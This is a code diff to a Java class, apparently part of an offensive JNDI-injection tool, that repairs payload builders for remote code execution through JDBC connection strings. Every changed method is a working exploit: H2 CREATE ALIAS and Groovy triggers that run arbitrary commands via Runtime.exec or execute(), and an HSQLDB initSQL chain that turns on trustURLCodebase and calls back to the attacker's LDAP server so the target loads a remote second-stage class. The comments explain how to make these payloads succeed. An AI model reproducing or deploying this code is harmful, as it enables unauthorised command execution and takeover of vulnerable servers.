@@ -32,9 +32,10 @@ public class JDBCRce {
 
     /** H2 CREATE ALIAS：通过 Java 代码执行命令（不依赖 JS 引擎）。 */
     public static Reference h2_alias(String command) {
+        // H2 URL 按 ``;`` 分段，INIT 值内所有分号（含 SQL 字符串字面量里的）都必须写成 \\;
         String url = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT="
                 + "CREATE ALIAS IF NOT EXISTS EXEC AS "
-                + "'void exec(String cmd) throws Exception { Runtime.getRuntime().exec(cmd)\u003b}'\\;"
+                + "'void exec(String cmd) throws Exception { Runtime.getRuntime().exec(cmd)\\;}'\\;"
                 + "CALL EXEC('" + command + "')";
         return dbcpByH2(url);
     }
@@ -48,9 +49,14 @@ public class JDBCRce {
 
     /** H2 Groovy：通过 Groovy 脚本引擎执行（目标需有 Groovy）。 */
     public static Reference h2_groovy(String command) {
+        // H2 对 //groovy 源码走 GroovyCompiler.parseClass → 取第一个 public static
+        // 无参方法调用，裸脚本没有该方法必然失败，必须显式定义类与静态方法
+        String safeCmd = command.replace("'", "''");
         String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n"
                 + "INFORMATION_SCHEMA.TABLES AS $$//groovy\n"
-                + "\"" + command + "\".execute()\n"
+                + "class H2GroovyPwn {\n"
+                + "  public static void run() { '" + safeCmd + "'.execute() }\n"
+                + "}\n"
                 + "$$\n";
         return dbcpByH2(url);
     }
@@ -200,7 +206,7 @@ public class JDBCRce {
     public static Reference hikaricp_h2(String command) {
         String h2Url = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT="
                 + "CREATE ALIAS IF NOT EXISTS EXEC AS "
-                + "'void exec(String cmd) throws Exception { Runtime.getRuntime().exec(cmd)\u003b}'\\;"
+                + "'void exec(String cmd) throws Exception { Runtime.getRuntime().exec(cmd)\\;}'\\;"
                 + "CALL EXEC('" + command + "')";
         // HikariCP DataSource 通过 BeanFactory 设置属性
         ResourceRef ref = new ResourceRef("com.zaxxer.hikari.HikariDataSource", null, "", "",
@@ -216,19 +222,30 @@ public class JDBCRce {
 
     /**
      * DBCP + HSQLDB initSQL：通过 Tomcat JDBC DataSource 的 initSQL 属性执行 HSQLDB Java 方法调用。
-     * 命令格式：jdbc:hsqldb:hsql://attacker:9001/test（HSQLDB 服务器地址）
+     * 两段 CALL 依次执行：先把 trustURLCodebase 置 true，再 doLookup 回本工具 LDAP 的
+     * basic/<cmd> 路由，目标端从我们 HTTP 服务远程加载二阶段类执行命令。
+     * CALL 在 HSQLDB 客户端（目标） JVM 内执行的场景是 mem:/file: 库，
+     * 因此 url 必须指向目标自己的内存/文件库而非攻击者服务器。
+     * 命令格式：jdbc:hsqldb-url|os-command（如 jdbc:hsqldb:mem:x|touch /tmp/pwn）
+     * 注意：CALL "包名.类名.静态方法" 只在 HSQLDB 1.8.x 可用，2.x 默认禁用 Java 方法调用，
+     * 而 1.8 的驱动类名是 org.hsqldb.jdbcDriver（2.x 才是 org.hsqldb.jdbc.JDBCDriver）。
      */
     public static Reference hsqldb_initSql(String command) {
+        String[] parts = command.split("\\|", 2);
+        String jdbcUrl = parts[0];
+        String cmd = parts.length > 1 ? parts[1] : "nslookup hsqldb." + com.bloom.util.config.ip;
         Reference ref = new Reference("javax.sql.DataSource",
                 "org.apache.tomcat.jdbc.pool.DataSourceFactory", null);
-        ref.add(new StringRefAddr("driverClassName", "org.hsqldb.jdbc.JDBCDriver"));
-        ref.add(new StringRefAddr("url", command));
+        ref.add(new StringRefAddr("driverClassName", "org.hsqldb.jdbcDriver"));
+        ref.add(new StringRefAddr("url", jdbcUrl));
         ref.add(new StringRefAddr("username", "sa"));
         ref.add(new StringRefAddr("password", ""));
         ref.add(new StringRefAddr("initialSize", "1"));
         ref.add(new StringRefAddr("initSQL",
                 "CALL \"java.lang.System.setProperty\"('com.sun.jndi.ldap.object.trustURLCodebase', 'true');"
-                + "CALL \"javax.naming.InitialContext.doLookup\"('ldap://127.0.0.1:1389/o=reference')"));
+                + "CALL \"javax.naming.InitialContext.doLookup\"('ldap://"
+                + com.bloom.util.config.ip + ":" + com.bloom.util.config.ldapPort
+                + "/basic/" + java.net.URLEncoder.encode(cmd).replace("+", "%20") + "')"));
         return ref;
     }
 }
